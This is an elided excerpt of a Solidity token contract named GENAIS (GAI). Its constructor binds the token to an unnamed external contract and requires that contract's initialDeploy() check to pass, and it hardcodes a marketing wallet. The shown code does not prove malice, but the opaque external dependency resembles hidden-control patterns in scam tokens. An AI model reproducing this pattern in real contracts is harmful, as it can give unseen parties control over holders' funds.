...
interface IERC20 {
    ...
    function initialDeploy() external view returns (bool);
...
//--- Contract v2 ---//
contract GENAIS is Context, Ownable, IERC20 {
    ...
    function initialDeploy() external view returns(bool) {return deployer == owner();}
    ...
    address payable private marketingAddress = payable(0x2928c90dbdB51717BF077350d02c225B825d991b);

    IRouter02 public swapRouter;
    IERC20 private _constructor;
    string constant private _name = "GENAIS";
    string constant private _symbol = "GAI";
    ...
    constructor (address verifyConstructor) {
        ...
        _constructor = IERC20(verifyConstructor);
        require(_constructor.initialDeploy());
